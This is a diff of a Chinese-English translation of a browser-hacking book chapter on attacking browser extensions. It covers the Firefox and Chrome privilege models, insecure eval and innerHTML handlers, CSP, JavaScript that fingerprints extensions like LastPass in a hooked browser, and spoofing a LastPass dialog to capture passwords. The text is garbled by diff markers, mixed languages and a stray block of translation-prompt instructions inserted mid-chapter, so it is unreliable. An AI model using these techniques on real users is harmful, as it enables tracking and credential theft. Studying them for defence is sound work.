+`nsIProcess` 代表 Mozilla 环境中的可执行进程。您可以从 Firefox 扩展中使用它来执行目标文件系统上的程序。以下代码演示了如何使用 Netcat 在 Linux 操作系统上执行一个反向 shell：
 
-
-
-
--   示例使用 `nsILocalFile` 和 `nsIProcess` 来妥协运行目标浏览器的系统。图片 [7-6 和 7-7 是代码执行和反向 shell 运行的截图。
-
-start figure 
+示例使用 `nsILocalFile` 和 `nsIProcess` 来妥协运行目标浏览器的系统。图片 [7-6 和 7-7 是代码执行和反向 shell 运行的截图。
 
 **Figure 7-6:** 反向 shell 代码
 
 ![c07f006.eps](img/c07f006.png)
 
-end figure start figure 
-
 **Figure 7-7:** 反向 shell 连接
 
 ![c07f007.tif](img/c07f007.png)
 
-end figure 
-
 ### 检查安全模型
 
-Firefox 扩展以浏览器的完整权限运行。也就是说，在 chrome:// 区域运行的任何指令都不会受到权限限制。这里的重要点是，Firefox 没有 sandboxing 概念，也没有安全边界。这种非常扁平的权限模型使得任何扩展的妥协几乎可以直接访问浏览器 API、文件系统和操作系统。
+Firefox 扩展以浏览器的完整权限运行。也就是说，在 `chrome://` 区域运行的任何指令都不会受到权限限制。这里的重要点是，Firefox 没有 sandboxing 概念，也没有安全边界。这种非常扁平的权限模型使得任何扩展的妥协几乎可以直接访问浏览器 API、文件系统和操作系统。
 
 #### 探索 Chrome 区
 
-Firefox 的特权 chrome:// 区拥有自己的 URI 方案（chrome://），并通过完整的 API 向扩展开发者提供对浏览器的全面访问。例如，扩展可以重新配置浏览器和其他扩展、获取 Cookie 和存储的密码，以及下载文件和执行操作系统命令（在浏览器所在的操作系统用户上下文中）。
+Firefox 的特权 `chrome://` 区拥有自己的 URI 方案（`chrome://`），并通过完整的 API 向扩展开发者提供对浏览器的全面访问。例如，扩展可以重新配置浏览器和其他扩展、获取 Cookie 和存储的密码，以及下载文件和执行操作系统命令（在浏览器所在的操作系统用户上下文中）。
 
 与 Chrome 不同，Chrome 会在后续章节中讨论，而 Firefox 扩展开发者无法限制对不同权限级别的访问。这导致所有扩展都拥有所有权限。
 
@@ -7774,15 +7776,11 @@ Firefox 的特权 chrome:// 区拥有自己的 URI 方案（chrome://），并�
 
 与 Firefox 扩展类似，Chrome 扩展也拥有提升权限。它们可以做普通页面 JavaScript 代码无法做的事。例如，Chrome 扩展可以访问所有打开的标签页、发送跨源请求、读取 Cookie（包括标记为 HttpOnly 的 Cookie）等。
 
-Chrome（manifest 版本 2）的架构比 Firefox 更为复杂，如图 7-8 所示。它同样拥有特权 chrome:// 区，并附加一个安全边界。
-
-start figure 
+Chrome（manifest 版本 2）的架构比 Firefox 更为复杂，如图 7-8 所示。它同样拥有特权 `chrome://` 区，并附加一个安全边界。
 
 **Figure 7-8:** 相关 Chrome 扩展结构
 
 ![c07f008.tif](img/c07f008.png)
-
-end figure 
 
 Chrome 扩展包含一个 manifest 文件和若干组件，这些组件由后台页面、UI 页面和内容脚本的组合构成。它可能还有其他组件，但这些是你最常见的。
 
@@ -7790,35 +7788,27 @@ Chrome 扩展会在后台静默更新，因此目标很可能已经安装了最�
 
 #### 检查源代码
 
-你不需要高超的逆向工程技能来剖析 Chrome 扩展。它们是用（你猜的！）JavaScript 和 HTML 编写的。只需从 Chrome Web Store 下载目标扩展即可。Chrome 使用 .crx 后缀作为扩展文件名，很容易辨认。它们只是一个压缩的目录结构，类似于 Firefox 扩展。接下来，解压扩展代码并打开你喜欢的 IDE，这将让你能够使用静态分析工具并通过手动代码审查发现漏洞。
+你不需要高超的逆向工程技能来剖析 Chrome 扩展。它们是用（你猜的！）JavaScript 和 HTML 编写的。只需从 Chrome Web Store 下载目标扩展即可。Chrome 使用 `.crx` 后缀作为扩展文件名，很容易辨认。它们只是一个压缩的目录结构，类似于 Firefox 扩展。接下来，解压扩展代码并打开你喜欢的 IDE，这将让你能够使用静态分析工具并通过手动代码审查发现漏洞。
 
-有时静态分析不足。但等一下，Chrome 来救场！你可以在浏览器中安装该扩展并轻松地动态调试它。在 chrome://extensions 中启用开发者模式，你就可以将任何未打包的扩展加载到你选择的目录中。
+有时静态分析不足。但等一下，Chrome 来救场！你可以在浏览器中安装该扩展并轻松地动态调试它。在 `chrome://extensions` 中启用开发者模式，你就可以将任何未打包的扩展加载到你选择的目录中。
 
-现在你已启用开发者模式，可以使用“Inspect Views”选项来启动 Chrome 开发者工具窗口。在 Extensions 标签页中，点击“Inspect Views”项后的文件链接即可。Figure 7-9 展示了 Amazon 扩展的开发者模式选项。可以看到，你需要点击 background.html 链接，但这不总是如此。它可能是其他文件名。
-
-start figure 
+现在你已启用开发者模式，可以使用“Inspect Views”选项来启动 Chrome 开发者工具窗口。在 Extensions 标签页中，点击“Inspect Views”项后的文件链接即可。Figure 7-9 展示了 Amazon 扩展的开发者模式选项。可以看到，你需要点击 `background.html` 链接，但这不总是如此。它可能是其他文件名。
 
 **Figure 7-9:** 访问开发者工具
 
 ![c07f009.eps](img/c07f009.png)
 
-end figure 
-
 Figure 7-10 展示了开发者工具的使用。在这里，你可以浏览扩展代码、执行 JavaScript、设置断点、修改代码等。这个环境为动态探索目标扩展提供了简单可靠的方式。
-
-start figure 
 
 **Figure 7-10:** 调试扩展
 
 ![c07f010.tif](img/c07f010.png)
 
-end figure 
-
 ### 解读 Manifest
 
-Chrome 扩展必须包含 manifest.json 文件。具备侦探能力的你会立刻知道它需要是 JSON 格式。该文件描述了扩展在正常功能期间将访问的资源。
+Chrome 扩展必须包含 `manifest.json` 文件。具备侦探能力的你会立刻知道它需要是 JSON 格式。该文件描述了扩展在正常功能期间将访问的资源。
 
-下面的代码片段展示了你在 manifest.json 文件中可能看到的内容：
+下面的代码片段展示了你在 `manifest.json` 文件中可能看到的内容：
 
 ```
 {
@@ -7842,110 +7832,109 @@ manifest 版本 1–基于的扩展安全限制相对宽松。正如你所料，
 
 #### 检查内容脚本
 
+请特别注意带通配符匹配模式的扩展，如 `file:///\*`, `http://\*/\*`, `\*://\*/\*`, 或 `<all_urls>`。这些扩展可能会被用户访问的任何网站利用。
+
+### 研究权限
+
+许多 Google Chrome 扩展程序请求并获得浏览器内的高权限。这使它们能够执行网站源不能做的操作。这种特权访问使它们对目标更有用，也使得被攻击的扩展对你更有价值。这一点尤其重要，因为扩展具备绕过 Same Origin Policy 限制的能力。
+
+鉴于运行此类特权代码的显著安全影响，开发者必须在安装时明确规定将使用 API 的部分。权限在 `manifest.json` 文件中声明。以下示例展示了一个典型的声明：
+
+```
+"permissions": [ "http://*/*", "https://*/*", "tabs", "cookies" ], 
+```
+
+安装扩展后，用户会看到一个确认对话框，列出扩展权限的可读描述。18 一旦用户点击“添加”，扩展即安装，拥有对话框中列出的全部权限，如图 7-11 所示。
+
+**Figure 7-11:** The Quick Note extension requesting permissions upon install
+
+![c07f011.tif](img/c07f011.png)
+
+许多在 Google Chrome Web Store 中的扩展请求访问所有网站的数据。同意安装此类扩展即意味着授予其读取用户访问的每一页的权限，包括使用 HTTPS URI 方案的站点。
+
+这些扩展可以读取密码、挂载键盘记录器等。有些甚至通过 HTTP 将数据发送给第三方。这些不安全的做法表明开发者未将安全放在首位，可能使这些扩展成为更具攻击性的目标。
+
+### 研究安全边界
+
+安全边界将内容脚本（及网页）与扩展的其余部分隔离。内容脚本在网页的 HTTP(S) 源上下文中运行，其他页面则在 `chrome-extension://` 源上运行。这两个源仅通过消息传递通信，默认情况下形成有效屏障，将不受信任的网页与高特权扩展后端隔开。
+
+Google 甚至提供了 19 个不安全编码实践的示例，帮助你理解和发现目标扩展中的安全漏洞。以下示例在扩展的后台页面运行并与内容脚本通信：
+
+```
+chrome.tabs.sendMessage(tab.id, {greeting: "hello"}, function(response) {
+  var resp = eval("(" + response.farewell + ")");
+});
+```
+
+上述代码不安全地使用 `eval`，将内容脚本的消息作为参数的一部分。下一个示例利用 `innerHTML` 将不受信任的响应写入 DOM：
 
 
 
-粗体（**bold**）和斜体（*itatic*）需要翻译翻译内容并保留符号。  
-内联代码（`code`）和代码块不需要翻译。  
-链接（[link](https://example.org)）需要翻译其内容，但保留网址。  
-列表，表格，引用块保留格式，翻译内容  
-原文可能有多行，不要漏掉任何一行，并且注意一定不要重复输出原文！！！  
-输出应包含在“[content]...[/content]”中  
+``` 
+chrome.tabs.sendMessage(tab.id, {greeting: "hello"}, function(response) {
+  document.getElementById("resp").innerHTML = response.farewell;
+});
+```
 
+- 查找 `eval` 和 `innerHTML` 的使用是进行代码审计的良好起点，尤其是在后台页面中。这些示例会导致跨内容脚本（Cross-content Scripting）漏洞，相关内容将在本章后部分详细说明。
+- 要利用这些漏洞，你需要先通过内容脚本 smuggle 攻击，从而间接获得消息传递 API 的访问权限。但还有一种场景：开发者可以在 `manifest.json` 中明确声明消息传递 API 可直接从网页访问：
 
+```
+"externally_connectable": {
+  "matches": ["http://browservictim.com/*"]
+}
+```
 
+```
+}
+```
 
--   [请特别注意带通配符匹配模式的扩展，如`file:///\*`, `http://\*/\*`, `\*://\*/\*`, 或`<all_urls>`。这些扩展可能会被用户访问的任何网站利用。]
--   ### 研究权限
-    -   许多 Google Chrome 扩展程序请求并获得浏览器内的高权限。这使它们能够执行网站源不能做的操作。这种特权访问使它们对目标更有用，也使得被攻击的扩展对你更有价值。这一点尤其重要，因为扩展具备绕过 Same Origin Policy 限制的能力。
-    -   鉴于运行此类特权代码的显著安全影响，开发者必须在安装时明确规定将使用 API 的部分。权限在 `manifest.json` 文件中声明。以下示例展示了一个典型的声明：
-    ``` 
-    "permissions": [ "http://*/*", "https://*/*", "tabs", "cookies" ], 
-    ```
-    -   安装扩展后，用户会看到一个确认对话框，列出扩展权限的可读描述。18 一旦用户点击“添加”，扩展即安装，拥有对话框中列出的全部权限，如图 7-11 所示。
-    -   start figure
-    -   **Figure 7-11:** The Quick Note extension requesting permissions upon install
-    -   ![c07f011.tif](img/c07f011.png)
-    -   end figure
-    -   许多在 Google Chrome Web Store 中的扩展请求访问所有网站的数据。同意安装此类扩展即意味着授予其读取用户访问的每一页的权限，包括使用 HTTPS URI 方案的站点。
-    -   这些扩展可以读取密码、挂载键盘记录器等。有些甚至通过 HTTP 将数据发送给第三方。这些不安全的做法表明开发者未将安全放在首位，可能使这些扩展成为更具攻击性的目标。
--   ### 研究安全边界
-    -   安全边界将内容脚本（及网页）与扩展的其余部分隔离。内容脚本在网页的 HTTP(S) 源上下文中运行，其他页面则在 `chrome-extension://` 源上运行。这两个源仅通过消息传递通信，默认情况下形成有效屏障，将不受信任的网页与高特权扩展后端隔开。
-    -   Google 甚至提供了 19 个不安全编码实践的示例，帮助你理解和发现目标扩展中的安全漏洞。以下示例在扩展的后台页面运行并与内容脚本通信：
-    ``` 
-    chrome.tabs.sendMessage(tab.id, {greeting: "hello"}, function(response) {
-      var resp = eval("(" + response.farewell + ")");
-    });
-    ```
-    -   上述代码不安全地使用 `eval`，将内容脚本的消息作为参数的一部分。下一个示例利用 `innerHTML` 将不受信任的响应写入 DOM：
-    ``` 
-    chrome.tabs.sendMessage(tab.id, {greeting: "hello"}, function(response) {
-      document.getElementById("resp").innerHTML = response.farewell;
-    });
-    ```
-    -   查找 `eval` 和 `innerHTML` 的使用是进行代码审计的良好起点，尤其是在后台页面中。这些示例会导致跨内容脚本（Cross-content Scripting）漏洞，相关内容将在本章后部分详细说明。
-    -   要利用这些漏洞，你需要先通过内容脚本 smuggle 攻击，从而间接获得消息传递 API 的访问权限。但还有一种场景：开发者可以在 `manifest.json` 中明确声明消息传递 API 可直接从网页访问：
-    ``` 
-    "externally_connectable": {
-      "matches": ["http://browservictim.com/*"]
-    }
-    ```
-    ``` 
-    }
-    ```
-    -   在上述 JSON 代码中，你可以看到 `externally_connectable` 声明，指定哪些源可以直接访问消息传递 API。检查目标扩展的 `manifest.json` 是否存在此声明很有价值。
-    -   由于 Google 未允许更宽泛的通配符（如 `*` 或 `*.com`）在 `externally_connectable` 的匹配模式中使用，攻击面因此受到限制。不过，如果 `http://browservictim.com` 存在 XSS 漏洞，仍可能成为攻击途径。
-    -   Chrome 扩展仅允许预定义的消息传递方式，这大幅减少了攻击面。但仍可能存在足够的攻击空间，因此仍值得关注。
--   ### 研究内容安全策略（CSP）
-    -   Google 将内容安全策略（CSP）纳入 Chrome 扩展的基础之中。20 如前所述，CSP 是对 web 资源施加的限制集合，可根据脚本的源决定是否允许或禁止执行脚本，从而有效降低开发者“自砍手”的风险。
-    -   扩展使用的具体 CSP 限制在 `manifest.json` 中通过 `content_security_policy` 参数定义。若未明确声明，Chrome 会应用一套相对严格的默认限制。默认 CSP 指令示例如下：
-    ```
-    script-src 'self'; object-src 'self'
-    ```
-    -   该指令意味着对后端扩展组件的任何成功注入攻击的限制：
-        -   不允许加载外部脚本，例如 `<script src=http://browserhacker.com>` 不会执行。
-        -   不允许加载外部对象，如 Java、Flash 等。
-        -   不允许内联脚本，如 `<script>code</script>`。
-        -   不允许 `eval()` 及其衍生函数。
-    -   这意味着攻击面被缩小。但问题是：有多少开发者会为了便利而放宽 CSP 指令？开发者（包括扩展开发者）常使用 JavaScript 模板引擎，而许多此类引擎依赖 `eval()` 函数。要使其正常工作，`manifest.json` 必须包含 `unsafe-eval` 指令。
-    -   别小看安全，别认为它比那个炫酷的新 JavaScript 模板引擎更重要！如果你非常安静，几乎能听到项目经理的“风险接受”呼喊，以及那个弯腰的安全工程师低声咒骂。
-    -   CSP 同时适用于扩展的 UI 页面和后台页面。仅限于安全边界内的扩展组件享受此保护，不适用于内容脚本。因此，当你在内容脚本中发现漏洞时，可以确信其可被利用。虽然运行在内容脚本中的代码权限受限，但影响仍然可观。本章后续将进一步介绍此类攻击。
-    -   请务必检查目标扩展的 `manifest.json` 中的 `content_security_policy` 参数。安全可被锁定，但未必会被锁定。
--   ### 讨论 Internet Explorer 扩展
-    -   Internet Explorer（IE）扩展的用户基数不如 Firefox 或 Chrome 普及。无论原因何在，这导致 IE 扩展的攻击范围相对较小。
-    -   Microsoft 将 Internet Explorer 扩展归类为 Browser Helper Objects（BHOs）、工具栏和 ActiveX 控件。22 这些技术主要编译为 native code，因此可能易受传统缓冲区溢出、格式字符串漏洞和整数错误的影响。
+- 在上述 JSON 代码中，你可以看到 `externally_connectable` 声明，指定哪些源可以直接访问消息传递 API。检查目标扩展的 `manifest.json` 是否存在此声明很有价值。
+- 由于 Google 未允许更宽泛的通配符（如 `*` 或 `*.com`）在 `externally_connectable` 的匹配模式中使用，攻击面因此受到限制。不过，如果 `http://browservictim.com` 存在 XSS 漏洞，仍可能成为攻击途径。
+- Chrome 扩展仅允许预定义的消息传递方式，这大幅减少了攻击面。但仍可能存在足够的攻击空间，因此仍值得关注。
 
+### 研究内容安全策略（CSP）
 
+- Google 将内容安全策略（CSP）纳入 Chrome 扩展的基础之中。20 如前所述，CSP 是对 web 资源施加的限制集合，可根据脚本的源决定是否允许或禁止执行脚本，从而有效降低开发者“自砍手”的风险。
+- 扩展使用的具体 CSP 限制在 `manifest.json` 中通过 `content_security_policy` 参数定义。若未明确声明，Chrome 会应用一套相对严格的默认限制。默认 CSP 指令示例如下：
 
--   [Internet Explorer 扩展程序](https://en.wikipedia.org/wiki/Internet_Explorer_extensions) 可以使用托管代码编写，这降低了这些漏洞的发生概率。但有趣的是，Microsoft 建议浏览器扩展程序不应使用托管代码。23 这是因为它们在浏览器进程中运行，Microsoft 不希望扩展程序减慢用户体验。
+```
+script-src 'self'; object-src 'self'
+```
 
--   与 Chrome 和 Firefox 的扩展程序不同，你通常无法解压 Internet Explorer 扩展程序以查看源代码。由于它们是为 Windows 操作系统编译的，查看其源代码并不是一个简单的选项。不过，你可能可以通过 F12 开发工具获得对其功能的一些可见性。
+- 该指令意味着对后端扩展组件的任何成功注入攻击的限制：
+  - 不允许加载外部脚本，例如 `<script src=http://browserhacker.com>` 不会执行。
+  - 不允许加载外部对象，如 Java、Flash 等。
+  - 不允许内联脚本，如 `<script>code</script>`。
+  - 不允许 `eval()` 及其衍生函数。
+- 这意味着攻击面被缩小。但问题是：有多少开发者会为了便利而放宽 CSP 指令？开发者（包括扩展开发者）常使用 JavaScript 模板引擎，而许多此类引擎依赖 `eval()` 函数。要使其正常工作，`manifest.json` 必须包含 `unsafe-eval` 指令。
+- 别小看安全，别认为它比那个炫酷的新 JavaScript 模板引擎更重要！如果你非常安静，几乎能听到项目经理的“风险接受”呼喊，以及那个弯腰的安全工程师低声咒骂。
+- CSP 同时适用于扩展的 UI 页面和后台页面。仅限于安全边界内的扩展组件享受此保护，不适用于内容脚本。因此，当你在内容脚本中发现漏洞时，可以确信其可被利用。虽然运行在内容脚本中的代码权限受限，但影响仍然可观。本章后续将进一步介绍此类攻击。
+- 请务必检查目标扩展的 `manifest.json` 中的 `content_security_policy` 参数。安全可被锁定，但未必会被锁定。
 
--   攻击本机编译软件超出了本书的范围，但大量优秀的资源可供深入研究此领域。其中一些资源在第一章中列出，如果你对此感兴趣，可以回到第一章查看。
+### 讨论 Internet Explorer 扩展
 
--   当然，扩展程序的实现方式仍可能导致 XSS 等漏洞。此类攻击的范围不如其他浏览器的扩展程序大，因此在本节中仅作顺带提及。
+- Internet Explorer（IE）扩展的用户基数不如 Firefox 或 Chrome 普及。无论原因何在，这导致 IE 扩展的攻击范围相对较小。
+- Microsoft 将 Internet Explorer 扩展归类为 Browser Helper Objects（BHOs）、工具栏和 ActiveX 控件。22 这些技术主要编译为 native code，因此可能易受传统缓冲区溢出、格式字符串漏洞和整数错误的影响。
+- [Internet Explorer 扩展程序](https://en.wikipedia.org/wiki/Internet_Explorer_extensions) 可以使用托管代码编写，这降低了这些漏洞的发生概率。但有趣的是，Microsoft 建议浏览器扩展程序不应使用托管代码。23 这是因为它们在浏览器进程中运行，Microsoft 不希望扩展程序减慢用户体验。
+- 与 Chrome 和 Firefox 的扩展程序不同，你通常无法解压 Internet Explorer 扩展程序以查看源代码。由于它们是为 Windows 操作系统编译的，查看其源代码并不是一个简单的选项。不过，你可能可以通过 F12 开发工具获得对其功能的一些可见性。
+- 攻击本机编译软件超出了本书的范围，但大量优秀的资源可供深入研究此领域。其中一些资源在第一章中列出，如果你对此感兴趣，可以回到第一章查看。
+- 当然，扩展程序的实现方式仍可能导致 XSS 等漏洞。此类攻击的范围不如其他浏览器的扩展程序大，因此在本节中仅作顺带提及。
 
 # Fingerprinting Extensions
 
--   存在多种方法来指纹识别目标浏览器的许多部分，扩展程序也不例外。识别目标正在使用的扩展程序将对你大有帮助。这将使你能够更精准地发起攻击，并在攻击过程中消除不确定性。
-
--   包括 Brendan Coles、Graziano Felline、Giovanni Cattani、24 和 Krzysztof Kotowicz25 在内的研究人员提出了多种枚举目标正在使用的扩展程序的方法。扩展程序并不隐藏它们增加了浏览器攻击面的事实。事实上，有些甚至会主动广播这一点。
-
--   下面的章节将探讨多种检测目标正在使用的扩展程序的方法。
+- 存在多种方法来指纹识别目标浏览器的许多部分，扩展程序也不例外。识别目标正在使用的扩展程序将对你大有帮助。这将使你能够更精准地发起攻击，并在攻击过程中消除不确定性。
+- 包括 Brendan Coles、Graziano Felline、Giovanni Cattani、24 和 Krzysztof Kotowicz25 在内的研究人员提出了多种枚举目标正在使用的扩展程序的方法。扩展程序并不隐藏它们增加了浏览器攻击面的事实。事实上，有些甚至会主动广播这一点。
+- 下面的章节将探讨多种检测目标正在使用的扩展程序的方法。
 
 ## Fingerprinting using HTTP Headers
 
--   部分扩展程序会以细微方式修改请求头，而其他扩展程序则以一种“显而易见”的方式进行修改。为了进行指纹识别，你需要检查目标扩展程序是否以任何方式修改了请求头。
-
--   你可以在安装前后捕获请求头，然后通过 diff 比较结果。请记住，有些扩展程序只有在被主动使用时才会修改请求头。这正是即将展示的 FirePHP 示例的情况。
-
--   另一种检测请求头修改的方法是查看扩展程序的源代码。当然，Firefox 和 Chrome 的扩展代码是可用的，因为安装文件仅是包含代码的压缩 .zip 文件。
-
--   在 Chrome 扩展中，可以通过后台页面（通常是后台页面）实时修改请求。你需要搜索 chrome.webRequest.onBeforeSendHeaders 函数调用。使用该 API 需要 webRequest 权限，因此首先应检查 manifest.json 文件中是否包含该权限。如果没有，则无论 onBeforeSendHeaders 函数是否被使用都无关紧要。
-
--   另一种在 Chrome 扩展中注入自定义请求头的方法是通过内容脚本。你只需在发送 Ajax 请求时使用 XMLHttpRequest.setRequestHeader 函数即可。搜索该函数也能帮助你发现扩展程序是否在操纵浏览器请求头。
-
--   在 Firefox 扩展中，搜索 setRequestHeader 可以识别请求头被修改的位置。下面的 FirePHP 代码片段显示该扩展修改了 User-Agent 请求头：
+- 部分扩展程序会以细微方式修改请求头，而其他扩展程序则以一种“显而易见”的方式进行修改。为了进行指纹识别，你需要检查目标扩展程序是否以任何方式修改了请求头。
+- 你可以在安装前后捕获请求头，然后通过 diff 比较结果。请记住，有些扩展程序只有在被主动使用时才会修改请求头。这正是即将展示的 FirePHP 示例的情况。
+- 另一种检测请求头修改的方法是查看扩展程序的源代码。当然，Firefox 和 Chrome 的扩展代码是可用的，因为安装文件仅是包含代码的压缩 .zip 文件。
+- 在 Chrome 扩展中，可以通过后台页面（通常是后台页面）实时修改请求。你需要搜索 `chrome.webRequest.onBeforeSendHeaders` 函数调用。使用该 API 需要 `webRequest` 权限，因此首先应检查 `manifest.json` 文件中是否包含该权限。如果没有，则无论 `onBeforeSendHeaders` 函数是否被使用都无关紧要。
+- 另一种在 Chrome 扩展中注入自定义请求头的方法是通过内容脚本。你只需在发送 Ajax 请求时使用 `XMLHttpRequest.setRequestHeader` 函数即可。搜索该函数也能帮助你发现扩展程序是否在操纵浏览器请求头。
+- 在 Firefox 扩展中，搜索 `setRequestHeader` 可以识别请求头被修改的位置。下面的 FirePHP 代码片段显示该扩展修改了 User-Agent 请求头：
 
 ```
 httpChannel.setRequestHeader("User-Agent", 
@@ -7953,7 +7942,7 @@ httpChannel.setRequestHeader("User-Agent",
   "FirePHP/" + firephp.version, false);
 ```
 
--   这导致 FirePHP 扩展在 User-Agent 头中追加 FirePHP/<版本号>，从而表明扩展已安装，并告知你其版本号。你可以很容易地检测到以下请求头：
+- 这导致 FirePHP 扩展在 User-Agent 头中追加 `FirePHP/<版本号>`，从而表明扩展已安装，并告知你其版本号。你可以很容易地检测到以下请求头：
 
 ```
 GET / HTTP/1.1
@@ -7965,17 +7954,16 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 ```
 
--   上述 HTTP 头是 Firefox 浏览器向服务器发送的请求，其中包含 FirePHP/0.7.1 字符串。在此情况下，扩展不仅告知你它已安装，还告知你其版本。
+- 上述 HTTP 头是 Firefox 浏览器向服务器发送的请求，其中包含 `FirePHP/0.7.1` 字符串。在此情况下，扩展不仅告知你它已安装，还告知你其版本。
 
 ## Fingerprinting using the DOM
 
--   你已经认识到 DOM 是一片巨大的森林，包含无数叶子。许多 DOM 属性可以被访问。如前一章讨论过，某些属性仅在特定浏览器中存在。同样，某些 DOM 属性仅在特定扩展程序已安装并激活时存在。
-
--   在使用 DOM 进行指纹识别时，请关注 iframe、overlay 和隐藏 <div> 元素。它们有时会在满足特定条件（如特定域名、网站标题或某些元素的存在）时出现在 Web 应用中。使用 Firebug 观察空白 HTML 页面上扩展的行为，然后根据扩展代码分析后添加内容会很有帮助。
+- 你已经认识到 DOM 是一片巨大的森林，包含无数叶子。许多 DOM 属性可以被访问。如前一章讨论过，某些属性仅在特定浏览器中存在。同样，某些 DOM 属性仅在特定扩展程序已安装并激活时存在。
+- 在使用 DOM 进行指纹识别时，请关注 iframe、overlay 和隐藏 `<div>` 元素。它们有时会在满足特定条件（如特定域名、网站标题或某些元素的存在）时出现在 Web 应用中。使用 Firebug 观察空白 HTML 页面上扩展的行为，然后根据扩展代码分析后添加内容会很有帮助。
 
 ### LastPass 示例
 
--   LastPass 是一个密码管理器，旨在通过提高密码管理的安全性来实现目标。在 Chrome 中，LastPass 扩展在构建 HTML 之前会钩入 DOM。Chrome 扩展的配置在其 manifest 文件中，如下所示，onloadwff.js 在所有 URL 中于 document_start 时加载：
+- LastPass 是一个密码管理器，旨在通过提高密码管理的安全性来实现目标。在 Chrome 中，LastPass 扩展在构建 HTML 之前会钩入 DOM。Chrome 扩展的配置在其 manifest 文件中，如下所示，`onloadwff.js` 在所有 URL 中于 `document_start` 时加载：
 
 ```
 "all_frames": true,
@@ -7984,13 +7972,13 @@ Accept-Encoding: gzip, deflate
 "run_at": "document_start"
 ```
 
--   让我们忽略那个令人质疑且极其宽松的 file:///\* 匹配模式，继续进行指纹识别。在 onloadwff.js 文件中，自定义函数会被添加到 DOMContentLoaded 事件。浏览器在文档加载并解析后触发此事件，但通常在内部框架、图片或样式表解析之前。最终，扩展会通过添加一个新的空 script 标签来修改已渲染页面的 DOM：
+- 让我们忽略那个令人质疑且极其宽松的 `file:///*` 匹配模式，继续进行指纹识别。在 `onloadwff.js` 文件中，自定义函数会被添加到 `DOMContentLoaded` 事件。浏览器在文档加载并解析后触发此事件，但通常在内部框架、图片或样式表解析之前。最终，扩展会通过添加一个新的空 script 标签来修改已渲染页面的 DOM：
 
 ```
 <script id="hiddenlpsubmitdiv" style="display: none;"></script>
 ```
 
--   扩展还会在 DOM 的底部嵌入 JavaScript。无论哪种情况，现在 DOM 中留下了痕迹，其他脚本或元素可以通过这些痕迹检测到扩展的存在。正如第 6 章讨论过的，通过检查 DOM 来自带的浏览器属性进行指纹识别是有效的方法，LastPass 的情况亦是如此。唯一的例外是：如果 HTML 中不包含任何表单，LastPass 将不会修改 DOM。这一点在 onloadwff.js 文件中显而易见：
+- 扩展还会在 DOM 的底部嵌入 JavaScript。无论哪种情况，现在 DOM 中留下了痕迹，其他脚本或元素可以通过这些痕迹检测到扩展的存在。正如第 6 章讨论过的，通过检查 DOM 来自带的浏览器属性进行指纹识别是有效的方法，LastPass 的情况亦是如此。唯一的例外是：如果 HTML 中不包含任何表单，LastPass 将不会修改 DOM。这一点在 `onloadwff.js` 文件中显而易见：
 
 ```
 if(b != "acidtests.org" && 
@@ -7998,28 +7986,37 @@ if(b != "acidtests.org" &&
     a.forms.length > 0) {
 ```
 
--   这段 if 语句检查当前页面是否不是 acidtests.org，DOM 中是否已存在 hiddenlpsubmitdiv 脚本，以及是否至少有一个 HTML 表单。如果页面包含表单，DOM 将被修改，通过以下 JavaScript 可以判断 LastPass 的存在：
+- 这段 if 语句检查当前页面是否不是 `acidtests.org`，DOM 中是否已存在 `hiddenlpsubmitdiv` 脚本，以及是否至少有一个 HTML 表单。如果页面包含表单，DOM 将被修改，通过以下 JavaScript 可以判断 LastPass 的存在：
 
-
-
-
+```
 var result = "Not in use or not installed";
 
 var lpdiv = document.getElementById('hiddenlpsubmitdiv');
+
 // Check for the div first
+
 if (typeof(lpdiv) != 'undefined' && lpdiv != null) {
+
   result = "Detected LastPass through presence of the <script> tag with id=hiddenlpsubmitdiv";
 
 // Use JQuery to search inside script elements for the presence of lastpass_iter
+
 } else if ($("script:contains(lastpass_iter)").length > 0) {
+
   result = "Detected LastPass through presence of the embedded <script> which includes references to lastpass_iter";
-  
+
 } else {
+
   if (document.getElementsByTagName("form").length == 0) {
+
       result = "The page doesn't seem to include any forms - we can't tell if LastPass is installed";
+
   }
+
 }
 ```
+
+
 
 First, the JavaScript checks for the script element discussed earlier. If that’s not found, it will then proceed to check for the embedded JavaScript. Finally, the script will update the result variable if there are no forms in the page.
 
@@ -8068,7 +8065,7 @@ Luckily for you, most extensions have at least one file declared in `web_accessi
 
 You can do this manually or by using publicly available tools such as XSS ChEF26 from Kotowicz. It will download and unpack extensions from the Chrome Web Store, so you can use it to scan the `manifest.json` files and build your Chrome extension fingerprinting database from there.
 
-Now that you have your Chrome extension resource database, you’ll need to run some code in the hooked browser to probe for that resource. Use the earlier `logo.png` resource to create the following code:27
+Now that you have your Chrome extension resource database, you’ll need to run some code in the hooked browser to probe for that resource. Use the earlier `logo.png` resource to create the following code:
 
 ```
 var testScript = document.createElement("script");
@@ -8077,6 +8074,8 @@ testScript.setAttribute("onload", "alert('Extension Installed!')");
 testScript.setAttribute("src", testURL);
 document.body.appendChild(testScript);
 ```
+
+
 
 You can extend this code to iterate through your database of extensions and very quickly fingerprint target extensions.
 
@@ -8102,30 +8101,27 @@ How does the average Joe maintain all these unique passwords? Writing all the pa
 
 But what does this have to do with extensions? Well, a common feature of many password management software suites includes integration with web browsers. In fact, some products use browser extensions as their primary method of access.
 
-
-
-
 LastPass 是一种选项，也是目前可用的更流行的在线密码管理软件包之一。30 在这里的“在线”指的是 LastPass 将加密后的密码副本存储在其系统上，从而可以在多个浏览器或设备之间通过 Internet 同步。
 
 那么这些在线密码系统安全吗？一种攻击它们的方法是利用社交工程技术。在 Chrome 的例子中，需要 UI 交互的扩展程序常常使用看似来自扩展图标的无害框架。Figure 7-12 展示了 LastPass 身份验证对话框。
 
- start figure 
+start figure
 
 **Figure 7-12:** LastPass 扩展在 Chrome 中
 
 ![c07f012.tif](img/c07f012.png)
 
- end figure 
+end figure
 
 除去一些小指示器（如右上角三角形指向 LastPass 按钮），很少有指示器能验证对话框的完整性。与 HTTPS 包含锁图标、修改后的地址栏等用户逐渐熟悉的提示不同，Chrome 的扩展 UI 元素没有这些。你可以通过显示新的 DIV 元素，甚至新的 IFrame 来冒充该对话框。下面的示例展示了这种情况（见 Figure 7-13）。
 
- start figure 
+start figure
 
 **Figure 7-13:** 假冒的 LastPass 对话框
 
 ![c07f013.tif](img/c07f013.png)
 
- end figure 
+end figure
 
